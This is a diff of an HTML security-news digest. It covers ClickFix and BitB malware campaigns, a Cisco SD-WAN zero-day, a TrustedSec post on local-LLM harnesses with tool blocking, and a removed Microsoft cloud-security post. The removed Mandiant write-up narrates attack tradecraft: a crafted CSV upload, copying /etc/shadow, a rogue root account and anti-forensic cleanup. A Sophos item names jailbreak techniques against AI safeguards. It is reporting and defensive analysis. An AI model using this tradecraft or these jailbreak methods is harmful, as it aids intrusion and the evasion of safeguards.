+[State-crime convergence](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#state-crime-convergence)NCC Group said it has found growing evidence of nation-state actors
+[increasingly leveraging](https://thehackernews.com/2026/05/muddywater-uses-microsoft-teams-to.html)tools and tactics traditionally associated with financially motivated cybercrime to disguise their espionage and intelligence-gathering operations, blurring the line between the two sets of activities. "Historically, organisations could draw a relatively clear distinction between ransomware attacks driven by financial gain and nation-state operations designed to support strategic objectives. That distinction is becoming increasingly difficult to make," Matt Hull, VP of Cyber Intelligence and Response at NCC Group,[said](https://www.nccgroup.com/newsroom/ncc-group-monthly-threat-pulse-review-of-may-2026/). "What we're seeing is a convergence of criminal and state-backed activity. Threat actors are sharing infrastructure, adopting common tooling and, in some cases, deliberately operating behind established ransomware brands to obscure attribution and delay response efforts." -
+[Admin reset alerts](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#admin-reset-alerts)Google said it's expanding the existing "Super Admin password reset" alert into a broader Admin password reset alert in
+[Alert Center](https://support.google.com/a/answer/9105393). "Previously, this rule only triggered alerts when a super admin's password was changed," the company[said](https://workspaceupdates.googleblog.com/2026/06/enhanced-security-monitoring-with-expanded-Admin-password-reset-alerts.html). "With this update, the alert will now cover password resets for all administrator roles within your organization. This update provides admins with better visibility and control over the security of their organization's privileged accounts. Monitoring password changes for all admin roles provides a higher level of oversight to respond more quickly to potential account compromises or unauthorized changes." The change is applicable to all Google Workspace customers. -
+[ClickFix targets macOS](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#clickfix-targets-macos)A new ClickFix campaign has been
+[observed](https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-20-ClickFix-campaign-delivers-macOS-infostealer-via-DMG.txt)tricking users into copying malicious commands and pasting them to the Terminal app that silently downloads and mounts a malicious DMG file. The disk image file contains a self-signed information stealer that can harvest a user's system password, data from web browsers, wallets, messaging apps, and Keychain, exfiltrate the data, set up LaunchAgent persistence, and tamper with Ledger Live and Trezor Suite installations by replacing legitimate components to hijack cryptocurrency wallet information. The stealer is assessed to belong to the Atomic macOS Stealer (AMOS) lineage, particularly a variant called Odyssey, per Palo Alto Networks Unit 42. The development comes as the cybersecurity company[detailed](https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-05-%20Evasive-ClickFix-Injection-Delivers-RAT.txt)another multi-step ClickFix attack that employs techniques like brandsquatting to deliver a cross-platform trojan with browser-credential stealing, remote shell, live screen streaming, keylogger, file manager, and SSH tunneling capabilities. -
+[TfL hackers convicted](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#tfl-hackers-convicted)Thalha Jubair, 20, from East London, and Owen Flowers, 18, from Walsall, have been
+[convicted](https://www.nationalcrimeagency.gov.uk/news/cyber-criminals-who-hacked-into-transport-for-londons-computer-network-are-convicted)in the U.K. for orchestrating a cyber attack on Transport for London (TfL) in 2024, costing $38.2 million in losses. The two defendants, who were members of the online criminal collective known as Scattered Spider, were[arrested](https://thehackernews.com/2025/09/uk-arrest-two-teen-scattered-spider.html)last September but[pleaded not guilty](https://thehackernews.com/2025/11/threatsday-bulletin-ai-malware-voice.html#teen-suspects-deny-charges-in-transport-for-london-hack)to their crimes during a court appearance in November 2025. They are now scheduled for sentencing on July 16, 2026. "Scattered Spider is a prolific criminal group that engages in data extortion and other criminal activities, utilizing social engineering techniques and SIM swap attacks, to obtain credentials, install remote access tools, and/or bypass multi-factor authentication," the U.S. Federal Bureau of Investigation (FBI)[said](https://x.com/FBICyberDiv/status/2069511171745480748). -
+[Marketplace admin extradited](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#marketplace-admin-extradited)Abdellah Belmili (aka Dila Belmili or SPOX), a 26-year-old Algerian national, has been arrested, charged, and extradited from Spain to the U.S. on charges of conspiracy to commit bank fraud. SPOX is alleged to have acted as an administrator for a cybercrime marketplace ("www.market0day[.]com") as well as created phishing kits that have been used to compromise major U.S. financial institutions. "Between September and November 2020, Belmili advertised the marketplace and facilitated some of the customer support for the marketplace on his personal Telegram channel @SpoxCoder," the U.S. Justice Department
+[said](https://www.justice.gov/usao-wdny/pr/algerian-man-arrested-extradited-united-states-his-role-black-market-fraud-conspiracy). "In late December 2020, after several customers complained that they had not received their purchases from www.market0day[.]com, Belmili replied that he was no longer the administrator, and instead had opened up a new marketplace – www.spoxy[.]us, advertising the new marketplace – www.spoxy.us, advertising the new marketplace as a 'new store for bulk SMS.' 'Bulk SMS' typically refers to sending phishing or other fraudulent messages via text message." Approximately 5,600 U.S. and international victims have been identified. -
+[Collaboration phishing](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#collaboration-phishing)A new phishing campaign is abusing Outlook Groups and Microsoft 365 collaboration features to "make malicious activity appear routine," Fortra said. The attack involves adding targets to an attacker-controlled Microsoft 365 group and then using the group mailbox, shared files, or fake calendar invites (aka CalPhishing) to facilitate credential theft, token capture, or malware delivery. "The technique shifts malicious intent away from a single phishing email into a trusted productivity workflow," the company
+[said](https://www.fortra.com/blog/phishing-through-collaboration). "A user may see what looks like a normal group addition, internal update, shared resource, or calendar item before being pushed toward an action." -
+[AI in cybercrime](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#ai-in-cybercrime)A new analysis from Sophos has
+[revealed](https://www.sophos.com/en-us/blog/ai-in-the-underground-curiosity-claims-and-concerns)that AI has emerged as a hot button topic in[underground communities](https://www.trendmicro.com/vinfo/gb/security/news/cybercrime-and-digital-threats/hype-vs-reality-ai-in-the-cybercriminal-underground), as threat actors debate its potential for malware and tool development, while some express concerns about the technology reducing work opportunities. This includes posts selling API keys for generative AI tools, advertising solutions that can enhance social engineering, AI-enabled malware (e.g., ApexAI, Metatron, and PolyEngine), discussing jailbreaks for public AI models to bypass censorship and other safeguards using techniques like role-play framing, multi-stage prompting, and contextual manipulation, and offers to hire or partner with prompt engineers. Threat actors have also discussed the use of public AI assistants for intrusion activity, as well as marketed a tool called Leak Bazaar that claims to use AI to triage and sift through mountains of stolen data before it can be packaged and exchanged with other threat actors. Not all have embraced AI with open arms, however, with some outlining skepticism and worries about how the rise of AI could "reshape roles, pricing, and competitive advantage within the cybercrime economy." -
+[8,500 REDCap instances](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#8-500-redcap-instances)Censys has
+[uncovered](https://censys.com/blog/redcap-exposure-analysis/)just over 8,500 REDCap instances globally as of June 16, 2026, with most of them located in the U.S., the U.K., Germany, and Australia. REDCap, short for Research Electronic Data Capture, is a web application used by research institutions globally to hold clinical trial data, participant records, and other sensitive research information. Last week, Google Threat Intelligence Group (GTIG) attributed a year-plus espionage campaign against North American academic, medical, and military research institutions to[UNC6508](https://thehackernews.com/2026/06/chinese-hackers-abused-google-workspace.html), a China-nexus actor. The intrusion set leveraged internet-facing REDCap servers as an initial access vector to deploy a backdoor called INFINITERED to exfiltrate sensitive data. Exactly how these servers are hacked is unconfirmed. The earliest known compromise dates to September 2023. -
+[Surveillance export gaps](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#surveillance-export-gaps)A report from Human Rights Watch has
+[revealed](https://www.hrw.org/news/2026/06/18/bulgaria-licensed-surveillance-exports-to-rights-violators)that a Bulgaria-based surveillance technology firm named Circles sold its tools to countries that were likely to use them for repression or to commit serious human rights violations. Documents describe licenses for exports of Circles' technology to Azerbaijan, Bahrain, Brazil, Dominican Republic, El Salvador, Ghana, Guatemala, Israel, Jordan, Malaysia, Mexico, Morocco, Panama, Serbia, and the U.A.E. Clients included intelligence services, military and police bodies, regional governments, and private companies, Human Rights Watch said. That said, it's currently not known whether the technology was actually exported. "Nonetheless, issuing the licenses demonstrates a major flaw in how individual governments implement E.U. export controls for surveillance technology," the non-profit said. "The controls are intended to limit exports of surveillance technology to destinations where there is a likelihood it could be used to violate rights, and to provide transparency about what exports take place." -
+[BitB malware lures](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#bitb-malware-lures)A campaign that impersonates popular software brand names has
+[leveraged](https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-22-malware-distribution-via-browser-in-the-browser-kit.txt)the Browser-in-the-Browser ([BitB](https://thehackernews.com/2025/11/sneaky-2fa-phishing-kit-adds-bitb-pop.html)) technique to distribute malicious payloads by means of a reusable phishing kit. It makes use of a draggable pop-up with a spoofed URL to serve a fake software update warning. "The campaign uses social engineering to trick victims into downloading and manually executing a malicious installer (e.g., an .exe payload)," Unit 42 said. "The pages simulate a stalled document load and present an 'out of date' software error." Earlier this month, Unit 42[disclosed](https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-08-Browser-In-The-Browser-Pishing-Campaign.txt)details of a second BitB campaign involving at least 10 unique domains that was used to steal Microsoft 365 credentials using a draggable, OS/browser-fingerprinted pop-up with a spoofed OAuth URL. In this attack, victims who click a Microsoft sign-in button are presented with what appears to be a standard login page designed to harvest credentials.
+If there’s a theme here, it’s that attackers do not need magic when the boring crap still works — forgotten creds, lazy trust, fake updates, loose admin paths, and users getting nudged into doing the dangerous part themselves. The future is here, somehow, and it still smells like a misconfigured staging box.
+Patch what you can. Revoke what you forgot. Maybe glance at the devices you’ve been treating like furniture. See you next ThreatsDay, assuming the internet hasn’t found an even dumber way to catch fire by then.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
             <h2 class="article-title">Cisco Catalyst SD-WAN Zero-Day CVE-2026-20245 Exploited to Gain Root Access</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/cisco-catalyst-sd-wan-zero-day-cve-2026.html" target="_blank">Original Link</a></p>
             <div class="content-text">An unknown threat actor exploited a recently disclosed high-severity security flaw impacting Cisco Catalyst SD-WAN as a zero-day at least two months before it was publicly disclosed, according to new findings from Google-owned Mandiant.
@@ -86,113 +585,100 @@ Google pointed out that the activity once again highlights the "continuing trend
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-1" class="article-body">
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">Large Workflows with Local LLMs</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/large-workflows-with-local-llms" target="_blank">Original Link</a></p>
+            <div class="content-text">Large Workflows with Local LLMs
+Table of contents
+Over the last few months, I have been digging into local LLMs and Frontier models. Frontier models have huge context windows, which gives them an advantage because it can keep the entire project in its context, but with smaller-scale tests, local LLMs can be extremely capable as well. In this post, I’ll be going over some pain points of using local LLMs and how I approached working around them.
+Picking a Local Model
+The first thing we should talk about is how to pick a good local model to use. During my testing, I broke these down into categories:
+- Summarization Tasks
+- Tasks where speed is more important and full info is provided for it to just summarize
+- Programming Tasks
+- Tasks where accuracy is the most important, and full context is not provided; an example would be having an LLM insert a function into a previously existing code base in a specific subset of files
+- Reverse Engineering Tasks
+- Tasks like using Ghidra to pull apart malware samples and clean up the disassembly
+- Research Tasks
+- Tasks that can provide multiple MCP servers to try to identify related topics that may not normally be categorized together
+All of these tasks can be done with different sized models, but some of them benefit HEAVILY from larger models. For example, a 20b to 35b model will do infinitely better than a 4b to 9b model on programming tasks, but a 4b to 9b model will run significantly faster than a 20b to 35b model on summarization tasks without a significant decrease in output. The size of model that you choose will depend on what you are trying to do, so experimentation with different models is recommended.
+Context Size Issues
+No matter what models you choose, some workflows end up needing more context than others. The problem is that most models I’ve encountered have an upper limit at 256K context. If you tried to use GhidraMCP with larger binaries and a local model through something like OpenCode, you may have noticed that after a while, the naming for some functions starts being wrong, and sometimes, some models may go into a loop trying tools that error out. When that happens, the context size may increase and need to be compacted through various methods, and it may just keep looping indefinitely, increasing the size of the context until you exit out. In these tasks, Frontier models seem to be an answer. Another option is to just use local models on smaller samples with a 256K context setup. There is also the concept of “context rot,” (5) when increasing the size of context doesn’t necessarily increase the performance of a model and, in some cases, degrades it based on size. Due to this, it’s worth testing how accurate your chosen model performs.
+LLMs Going Off the Rails
+Another major issue I’ve encountered is that, when using tools like Claude Code and OpenCode, even when in “plan mode,” it seems the LLM is what determines if it can run specific tools. When the LLM decides to follow instructions, that works fine, but if you are going to be running long-term workflows, completely disabling specific tools would be ideal. For instance, if the workflow you are running only needs GhidraMCP’s functions and writing a file to disk, then it would be nice to ACTUALLY block all tool calls in the harness to do stuff like shell, read file, list files, web request, etc., instead of just trusting the LLM to listen to instructions and do it for you.
+An Attempt to Address These
+While thinking about these issues, I decided that having a basic Python library that we can provide to OpenCode, and a local model, to generate full harnesses that will divide long-running tasks into smaller bite-sized chunks, could be the solution. While designing this based off of the previous issues, I gave myself a few requirements:
+- Avoid all dependencies outside of Python’s standard library.
+- Interface with OpenAI-compatible endpoints.
+- Support /mcp (Streamable HTTP) endpoints and /sse (HTTP with SSE) endpoints.
+- Be able to provide custom tools in the harness script.
+- Be able to block specific tool calls from being accessed in specific sections.
+- Be set up in such a way that local models can generate harness scripts automatically.
+The first test case I focused on for this initial attempt was simply using GhidraMCP and a local model to annotate every function in an extremely large binary and provide a basic summary and analysis of possible issues. The second was to build a generic C and C++ analysis script that can run over larger projects, summarize each file, and output to a folder, and a shared script that can summarize both sets of outputs in a report.
+Encountered Issues
+To start, I wanted to leverage local models only to generate the basic building blocks of what would end up being the Python library. I started in plan mode with OpenCode and qwen3-coder-next, provided instructions, answered all the questions, and reviewed the plan. After reviewing the results and confirming everything in the plan looked good, I tasked the agent to implement it. In this case, I chose qwen3-coder-next, simply because in past testing, it seemed to be consistent at generating Python and basic C code. When done, implementing all the basic scaffolding was close to what I wanted, which sped up development significantly. There were a few pain points, though—the biggest one was that the SSE (Server-Sent Events) MCP (Model Context Protocol) seemed to be extremely difficult for it to figure out, so I had to work on that myself to get it set up and working right. Although, once it was set up, I was able to use GhidraMCP and a testing MCP server to provide markdown documentation without issues, which I considered pretty good success.
+Once the basic library was functioning, the next step was making sure that the tools were only exposed if we allowed it. This is where another issue popped up. As it turns out, sometimes different LLMs like to guess tool names, even if no tools are provided. When building the scaffolding, the LLM thought that just not providing the tool names to the LLM was enough. Even when stating that it was ONLY allowed to call specific tools, it was still attempting to guess other tool names. To address this, I went in and, before running the tool function, validated that the harness was allowed to run the tool before calling it. This way, each section of the harness script could be allowed only the specific tools they should use, and this entire library doesn’t have any mechanism to run shell commands—just MCP tool calls and built-in tools.
+The next problem encountered was during my testing phase. I decided a perfect test was to run it over a binary with 700+ functions in it, but I couldn’t write that harness because the goal is to have a local model run it. So, I provided OpenCode and qwen3-coder-next the README that was generated for this library, a few examples, the instructions of what I wanted it to do, and where the LLM and MCP endpoints were, and let it try to divide up the tasks. The big issue here was that the auto-generated system prompt wasn’t as explicit as I would have liked, and the first three (3) iterations ended up looping on tool calls forever. I decided that a safety check for this would be to be able to set a timeout for tool calls. If tool calls loop so many times that the timeout is hit, then stop trying and continue on to the next item. After a few more tweaks to the system prompt, I was able to get it to stop looping as often but thought the tool timeout would be a safe setting.
+In my follow-on test, I picked out a random binary I had lying around and tried to run it over one with over 10,000 functions, and another issue popped up that would happen every so often. The LLM would time out in prompt processing if a tool call was made that happened to return a TON of data. This is bad, because we have a limited context, so I modified the system prompt to avoid calling specific tools I knew would provide too much data, and that mostly fixed it. I also added a timeout to the library so that if it hangs for longer than a specified amount of time, at least we can bail and try again later.
+With the first test script working, I tried to generate an additional example by having OpenCode and a local model to generate the C and C++ scanner script. The purpose of this test was, when testing local models directly in OpenCode, to scan moderately sized projects— the amount of tool calls and source code being read in used up a ton of context. I thought that we could break these projects up into files. Provided that the model has enough context to handle the largest file in the project, it should be perfectly fine. I went into “plan mode,” and it immediately spun up a sub-agent that just generated the script without prompting for any questions, and then it tried to reimplement the script from the main agent. The plus side was that, since I pointed it at the previous script, the analysis output was identical. I decided to run it over a small project, and to my surprise, it generated output, and the spot-checked issues were real bugs. Some examples were NULL-dereferences and a stack overflow sample. A few of those can be seen later in the screenshots. The system prompt wasn’t ideal—it didn’t provide examples of what sort of bugs to identify, and it lacks context of what was checked from other files before calling—but it did identify valid issues without running into context issues. I then scaled it up and ran it over a larger project and it ran without issue. I again counted this as a win.
+Project Details
+To use this library, there are a few basic components needed. I tried to keep it as simple as possible so that any local model could handle generating the code. The main class is ‘ChatSession’, which takes the following arguments:
+- system_prompt
+- This is a custom system prompt for the task you want the script to do.
+- tool_list
+- This is a list of custom tools you want to make available to the LLM. An example of how to register tools is in “example_getcwd.py”.
+- mcp_servers
+- This is a dictionary of MCP server names and locations to expose to the LLM.
+- llm_endpoint_url
+- This is the OpenAI compatible endpoint.
+- model_name
+- This is the model that you want it to use.
+- timeout
+- This is a timeout value for the LLM responses. By default, it is set to 60 seconds.
+- max_runtime
+- This is the maximum dedicated time you want to provide a prompt. For example, if you think the LLM may try to loop on tool calls, you can specify that you want it to run at most five (5) minutes before giving up and moving on.
+All of these are optional, but the model_name should be specified at a minimum if you are running LMStudio server on localhost. Once initialized, you simply call the ‘run_prompt’ function with the user prompt and wait for a response. The response will have an “error” key or “content” key. For more complex tasks like directly calling an MCP server’s tools from Python, you can call ‘registry.execute_tool(“tool_name_here”, {“arg1”: “value1”})’, which will then call the tool and get the content from the server. A full, simple example is provided in “example_ts_llmlib.py”.
+Example Scripts Usage
+By default, all the scripts are pointing at 127.0.0.1 for all LLM and MCP endpoints. There are two (2) models hardcoded, and these can be updated to point at your preferred systems before installation by updating in the example files:
+- qwen3.5-35b-a3b
+- qwen3.5-9b
+These were chosen just so that a Mac with 64 gigs of ram can run everything locally; the only model that uses qwen3.5-9b is example_ts_llmlib.py. You can also override the endpoints from localhost to whatever system you want by using the TS_LLM_MODEL/TS_LLM_ENDPOINT variables.
+ts_llmlib-ghidra-analyze
+Ghidra analyze is the example script that will use GhidraMCP to annotate all functions and, depending on the flags provided, analyzes for bugs with a super-simple system prompt. It’s being released in this state to show how it could be done. If anyone wants to extend the system or user prompts to get better results, please open a pull request. An example of how to run it is provided below:
+Following the list of functions, the script will then begin to process them all as follows:
+To skip the renaming step, provided you already annotated all functions in the repo, you can run the following:
+This will run full cleanup and grouped analysis to dump out a commented and cleaned-up C file for each function, along with a JSON file of analysis and an overview summary of the binary.
+To dump the vulnerabilities found, you can run the following command:
+This will also produce a summary:
+The final part is the group-analysis step. This takes the summaries of individual function groups (up to 10 functions each) and then generate an overview of the binary’s functionality. An example of that is in the screenshot below.
+In this case, it was just run over a basic practice malware sample, and the conclusion section ended up as this:
+This ended up using the following number of tokens for the summarization of all those groups, which in my testing cases was the part that used the most tokens for context.
+ts_llmlib-cpp-analyze
+This is similar, but instead of processing every function, it processes each file in a directory structure that ends with ‘.c’ or ‘.cpp’. The output folder will be the same structure as ‘ts_llmlib-ghidra-analyze’, so running the same ‘ts_llmlib-ghidra-report’ will generate the same overview report as above.
+ts_llmlib-redclippy
+This is the only example that has an added dependency, and that is pyside6. It is a simple qt script that is set up as an example of how to run the conversation without blocking the UI.
+After a second or so, this will pop up the response:
+Takeaways
+Although not ideal given the limitations of current local models, this provides a decent way to divide up tasks and allow larger workflows to be run with locally when needed. With enough tweaking and updates to the system prompts and logic, hopefully these scripts can be repeatable standalone workflows that can be run as needed without Frontier models.
+Future Work
+- Provide immediate surrounding context to function calls in C/C++ directly
+- Provide examples of vulnerabilities in the analysis system prompts of what to look for
+- Provide examples of additional large workflows that Frontier models are used for currently</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
             <h2 class="article-title">Mandiant reveals how Cisco SD-WAN zero-day attacks gained root access</h2>
             <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/mandiant-reveals-how-cisco-sd-wan-zero-day-attacks-gained-root-access/" target="_blank">Original Link</a></p>
-            <div class="content-text">New details have been revealed on how hackers exploited a Cisco Catalyst SD-WAN vulnerability tracked as CVE-2026-20245 in zero-day attacks to create rogue root accounts on targeted devices.
-The [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) vulnerability is a high-severity command injection flaw in Cisco Catalyst SD-WAN Manager (vManage), Controller (vSmart), and Validator (vBond) that allows authenticated attackers to execute arbitrary commands as root by uploading a crafted file.
-Cisco said the vulnerability stemmed from insufficient validation of user-supplied input and could be exploited by authenticated attackers with local access to affected devices.
-When Cisco disclosed the flaw earlier this month, the company warned that it had been [exploited in a limited number of attacks](https://www.bleepingcomputer.com/news/security/new-cisco-sd-wan-flaw-exploited-in-zero-day-attacks-to-gain-root/) but did not provide any details.
-Cisco only stated that successful exploitation allowed attackers to gain root privileges and that some incidents involved unauthorized configuration changes being pushed to edge devices.
-The company released security updates and urged customers to upgrade to fixed software versions, stating that no workarounds were available.
-New exploitation details emerge
-In a report published today, [Mandiant revealed](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager) that CVE-2026-20245 was exploited as a privilege-escalation vulnerability after attackers had already gained access to targeted SD-WAN devices.
-According to the researchers, the intrusion began with unauthorized SD-WAN peering connections observed on a service provider's infrastructure.
-Beginning in March 2026, the threat actor established new rogue peer connections and authenticated to affected SD-WAN Manager devices using the vmanage-admin
-account.
-Mandiant believes the rogue peering may have been created by exploiting previously disclosed Cisco SD-WAN authentication bypass zero-days, [CVE-2026-20127](https://www.bleepingcomputer.com/news/security/critical-cisco-sd-wan-bug-exploited-in-zero-day-attacks-since-2023/) and [CVE-2026-20182](https://www.bleepingcomputer.com/news/security/cisco-warns-of-new-critical-sd-wan-flaw-exploited-in-zero-day-attacks/), though the exact method remains unclear.
-After gaining access, the attackers changed the default admin account password, logged in to the SD-WAN Manager web interface, and extracted configuration information for edge devices, controllers, and SD-WAN templates.
-Mandiant says the attackers subsequently restored the admin account to its original password after completing their activity, likely to reduce detection.
-The researchers say the attackers then exploited CVE-2026-20245 through a tenant-upload feature in the SD-WAN command-line interface by uploading a malicious CSV file named "evil_tenant.csv."
-"[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx), a vulnerability reported to Cisco by Mandiant, exists in the command-line interface (CLI) of Cisco Catalyst SD-WAN Controllers that could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system," explains Mandiant.
-Mandiant says the malicious payload first created backups of system configuration files, including /etc/passwd
-and /etc/shadow
-, before creating a new account named "troot
-" with root-level privileges.
-The attackers then used the Linux "su
-" command to switch from the compromised administrative account to the newly created root account, giving them full control over the device.
-Mandiant says the attackers heavily relied on anti-forensic tactics to evade detection.
-This includes backing up configuration files before modifying them and then restoring them after exploitation. They also cleaned up traces of exploitation by deleting the malicious CSV payload, removing temporary files created during the attack, and erasing evidence of the rogue root account.
-The researchers also observed the execution of a validation script to confirm that all traces of the compromise had been removed from the device.
-Mandiant says some rogue peering activity observed in March 2026 occurred on systems that were not vulnerable to any of the previously disclosed authentication-bypass flaws.
-Cisco told the researchers that the breach did not involve CVE-2026-20182 and said it was possible the attackers used certificates stolen during a previous compromise to regain access to devices.
-Mandiant has published indicators of compromise, attacker IP addresses, and guidance to help organizations determine whether they were compromised.
-Organizations should collect diagnostic data from SD-WAN devices, check for signs of unauthorized peering connections, and upgrade to the latest software releases if they have not already done so.
-[Test every layer before attackers do](https://hubs.li/Q04jQ9z40)
-Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen.
-The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection.
-[Get the whitepaper](https://hubs.li/Q04jQ9z40)
-Post a Comment Community Rules
-You need to login in order to post a comment
-Not a member yet? Register Now</div>
+            <div class="content-text">New details have been revealed on how hackers exploited a Cisco Catalyst SD-WAN vulnerability tracked as CVE-2026-20245 in zero-day attacks to create rogue root accounts on targeted devices. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">CNAPP evolution: How Microsoft aligns with leading cloud risk management platforms</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/06/24/cnapp-evolution-how-microsoft-aligns-with-leading-cloud-risk-management-platforms/" target="_blank">Original Link</a></p>
-            <div class="content-text">Cloud security is shifting from visibility to context-aware risk reduction, helping security teams understand which exposures matter most, prioritize what can be exploited, and reduce risk across the application lifecycle. As organizations continue to expand across multicloud environments, Kubernetes, APIs, and AI-powered workloads, security teams are overwhelmed with signals. The challenge is no longer identifying individual risks, but determining which combinations of vulnerabilities, identities, and data exposures are most critical to address at the source.
-[Frost & Sullivan’s 2026 Frost Radar™ for Cloud-Native Application Protection Platforms (CNAPP)](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/Cloud-Native-Application-Protection-Platforms-2026-Microsoft.pdf) reflects this shift. The report highlights how CNAPP is evolving from a collection of posture and workload capabilities into a unified cloud risk operations platform—one that correlates signals across code, cloud, runtime, and SOC workflows to prioritize and reduce risk continuously. Within this evolving market, Microsoft is positioned among leading CNAPP vendors—reflecting alignment with where the category is heading.
-Why CNAPP is being redefined
-The Frost Radar makes a clear point: CNAPP is no longer about visibility or compliance—it is becoming an operational platform for reducing risk.
-Modern environments introduce complexity across:
-- Multicloud and hybrid infrastructure.
-- Rapid development and continuous deployment.
-- Containers, serverless, and APIs.
-- AI-powered workloads.
-This complexity exposes the limits of traditional tools.
-Organizations now require platforms that can:
-- Correlate posture, runtime, identity, and data signals.
-- Prioritize risk based on exploitability—not severity alone.
-- Integrate security across development and operations.
-- Support faster investigation and response.
-This is the shift: from detecting issues to operationalizing risk reduction across the application lifecycle.
-What distinguishes leading CNAPP platforms
-Frost evaluates CNAPP providers based on growth and innovation—but more importantly, on how effectively they help organizations manage risk.
-According to the report, five themes define the next generation of platforms:
-- Platform unification over point solutions.
-- Code-to-cloud-to-SOC integration.
-- Risk prioritization based on exploitability.
-- Correlation across identity, data, and application context.
-- Expansion into AI-powered workloads.
-These capabilities represent a shift from fragmented visibility to connected, contextual risk management.
-How Microsoft aligns with CNAPP’s next phase
-1. Correlating risk across identity, endpoints, data, and cloud
-Most security tools surface findings. Fewer connect them meaningfully. Modern attacks exploit the combination of misconfigurations, excessive permissions, and data exposure—not isolated issues. [Microsoft Defender for Cloud](https://www.microsoft.com/en-us/security/business/cloud-security/microsoft-defender-cloud) correlates posture findings with identity, data, and runtime signals—helping surface risks that are exploitable. A misconfigured storage resource on its own may not appear critical. But when combined with excessive access permissions and the presence of sensitive data, it can create a clear attack path.
-What this means: Security teams can prioritize real attack paths instead of individual findings, reducing alert fatigue and improving remediation speed and precision.
-2. Extending security from code to cloud to SOC
-Security must operate continuously across development, runtime, and operations.
-Defender for Cloud connects:
-- Code and infrastructure-as-code scanning.
-- Cloud posture and runtime protection.
-- Security operations and response workflows.
-A vulnerability identified in infrastructure-as-code before deployment can be tracked through to runtime—where it is validated against real-world behavior and surfaced in security operations if actively exploitable.
-What this means: Organizations move from fragmented workflows to continuous risk validation and response across the lifecycle.
-3. Reducing complexity across fragmented security workflows
-As environments scale, tool sprawl limits visibility and slows response. Microsoft delivers CNAPP capabilities as part of a connected platform—integrating posture management, workload protection, identity, data, and threat detection across multicloud environments. Instead of switching between separate tools, security teams can investigate a single incident across initial misconfiguration, runtime impact, and identity exposure, enabling a more connected experience.
-What this means: Security teams can investigate faster, prioritize risk more consistently, and reduce exposure across fragmented cloud environments.
-Where security leaders focus next
-The Frost Radar offers a signal for where cloud security is headed: toward platforms that connect context across cloud environments so teams can prioritize the risks most likely to be exploited and reduce exposure faster.
-Security leaders should now ask:
-- Can the platform correlate signals across identity, end points, data, cloud, and runtime?
-- Does it span the full code-to-cloud lifecycle?
-- Can it prioritize risk based on exploitability—not just severity?
-- Does it integrate with SOC workflows for faster response?
-- Can it scale across multicloud and AI environments?
-These are the capabilities that define the next generation of CNAPP.
-Bottom line
-[Frost & Sullivan’s 2026 CNAPP analysis](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/Cloud-Native-Application-Protection-Platforms-2026-Microsoft.pdf) reinforces a clear shift: Cloud security is moving from fragmented visibility to unified, contextual risk management across the entire lifecycle. Microsoft’s position in the Frost Radar reflects this shift—bringing together posture, runtime, identity, end points, and data signals into a connected platform that helps organizations prioritize and reduce risk continuously.
-Learn more
-- Read
-[Frost & Sullivan’s 2026 Frost Radar™ for Cloud-Native Application Protection Platforms (CNAPP)](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/Cloud-Native-Application-Protection-Platforms-2026-Microsoft.pdf)to see how leading vendors are evaluated—and how the category is shifting toward unified cloud risk operations platforms. - Explore
-[Microsoft cloud security solutions](https://www.microsoft.com/en-us/security/business/solutions/cloud-security)to see how unified posture management, risk prioritization, and protection across the application lifecycle can help reduce cloud risk.
